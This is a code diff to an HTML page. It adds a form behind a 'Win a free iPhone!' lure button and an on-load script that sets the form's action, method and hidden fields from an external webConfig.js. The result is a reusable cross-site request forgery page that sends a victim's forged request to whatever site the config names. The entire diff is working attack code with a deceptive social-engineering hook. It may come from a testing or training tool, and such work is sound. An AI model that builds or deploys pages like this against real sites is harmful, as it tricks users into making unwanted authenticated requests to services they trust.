@@ -1,7 +1,27 @@
 <html>
    <head>
       <link rel="stylesheet" href="styles.css" />
+      <script src="webConfig.js"></script>
    </head>
    <body>
+      <form id="mainForm" action="" method="">
+         <button type="submit">Win a free iPhone!</button>
+      </form>
    </body>
+   <script>
+      window.onload = function () {
+         var form = document.forms.mainForm;
+         form.action = webConfig.url;
+         form.method = webConfig.verb;
+
+         for (var i = 0; i < webConfig.params.length; i++) {
+            var param = webConfig.params[i];
+            var input = document.createElement('input');
+            input.type = 'hidden'
+            input.name = param.name;
+            input.value = param.value;
+            form.appendChild(input);
+         }
+      }
+   </script>
 </html>
